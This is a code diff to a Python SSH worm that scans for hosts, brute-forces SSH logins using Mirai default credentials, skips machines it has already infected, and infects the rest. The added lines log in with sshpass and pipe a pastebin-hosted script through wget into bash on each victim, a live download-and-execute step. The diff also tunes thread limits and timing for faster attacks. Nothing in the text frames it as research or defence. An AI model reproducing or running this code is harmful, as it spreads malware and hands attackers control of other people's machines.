@@ -5,9 +5,10 @@ import socket
 import time
 
 #function called when dictionary attack found a password
-def passwordFoundCallback(password, sharedO):
+def passwordFoundCallback(password, sharedO):   
     sharedO.setFound(password)
-    print ("Found Password for host: " + sharedO.getHost() + " password: " + sharedO.getPassword())
+    print ("Found Password for host: " + sharedO.getHost()) #+ " password: " + sharedO.getPassword() + "\n")
+    #print ("Password: " + shared.getPassword())
 
 class sharedThings():
     def __init__(self, host):
@@ -26,10 +27,10 @@ class sharedThings():
         self.password = password
     def isFound(self):
         return self.found
-        def getPassword(self):
-                return self.password
-        def getHost(self):
-                return self.host
+    def getPassword(self):
+        return self.password
+    def getHost(self):
+        return self.host
 
 class BruteForceTask(Thread):
     def __init__(self, host, password, sharedO):
@@ -41,14 +42,16 @@ class BruteForceTask(Thread):
 
     def run(self):
         try:
-            tempPassFileScript = self.password
-            f = open(self.password, "w+")
-            f.write("echo " + tempPassFileScript)
-            f.close()
-            subprocess.check_output(["chmod", "+x", tempPassFileScript])
-            time.sleep(0.1)
-            print ("trying with password: " + self.password)
-            subprocess.check_output(["./ssh_session.sh", tempPassFileScript, self.host])
+            #tempPassFileScript = self.password
+            #f = open(self.password, "w+")
+            #f.write("echo " + tempPassFileScript)
+            #f.close()
+            #subprocess.check_output(["chmod", "+x", tempPassFileScript])
+            #time.sleep(0.1)
+            #print ("trying with password: " + self.password)
+            cmd = "setsid sshpass -p \"{0}\" ssh {1} \"wget -q -O - https://pastebin.com/raw/dFrUfqat | tr -d '\\r' | bash\"".format(self.password, self.host)
+            print("calling cmd: " + cmd)
+            subprocess.check_output(cmd, shell=True)
             passwordFoundCallback(self.password, self.sharedO)
         except:
                 pass
@@ -59,7 +62,7 @@ class BruteForceTask(Thread):
                 #                                                       - Connection refused (the port isnt open)
                 #                                                       - Other errors (the host isnt found and stuff)
         finally:
-                subprocess.check_output(["rm", tempPassFileScript])
+                #subprocess.check_output(["rm", tempPassFileScript])
                 self.sharedO.decthreadCount()
 
 class SocketListener(Thread):
@@ -112,7 +115,7 @@ for ip in listedNmapString:
         except:
                 errorOccured = True
 
-        threadLimit = 30 #this is experimentally the highest ive reached without getting connection closed error
+        threadLimit = 8 #this is experimentally the highest ive reached without getting connection closed error
         sharedO = sharedThings(host) #used to mimic static variable. Used by processes to notice that they found a password
                                                              #need an instance of sharedThings per attacked Host
         #TODO: ssh root login is disabled on PIONE; Couldnt test PITWO since i cant find it
@@ -120,24 +123,35 @@ for ip in listedNmapString:
                 print('ErreurOccured = false, dataDecoded = OK')
                 print('Machine already infected. Passing to the next one...')
                 continue
-
-
-        print('Found a possible computer to infect. Trying to bruteforce the machine...')
+        
+        
+         
+        print('Found a possible computer to infect. Trying to bruteforce the machine...' + host)
         # we could parallelize each attack on hosts
         # the bottleneck of the technique seems to be the time it takes to receive the answer from the attacked host
-        with open("./passwords.txt") as f:
+        threadArray = []
+        with open("./mirai_creds.txt") as f:
                 for line in f:
-                        t = BruteForceTask(host, line, sharedO)
+                        username, password = line.split(':')
+                        password = password.rstrip()
+                        username  = username + "@" + host
+                        #password = "\"" +password
+                        print("host: " + username)
+                        print("password: " + password)
+                        t = BruteForceTask(username, password, sharedO)
                         t.start()
-                        time.sleep(0.03)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
+                        threadArray.append(t)
+                        time.sleep(0.05)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
                         #can be a lot faster when executing locally (local: 0.03 vs web: 0.3)
 
                         sharedO.incthreadCount()
                         while threadLimit < sharedO.getthreadCount():
-                                time.sleep(1)
+                                time.sleep(0.01)
                         if sharedO.isFound():
                                 break
-        if sharedO.found:
+        for t in threadArray:
+            t.join(timeout=1)
+        if sharedO.isFound():
                 password = sharedO.password
                 print('Infecting the machine...')
                 # Infect the machine here
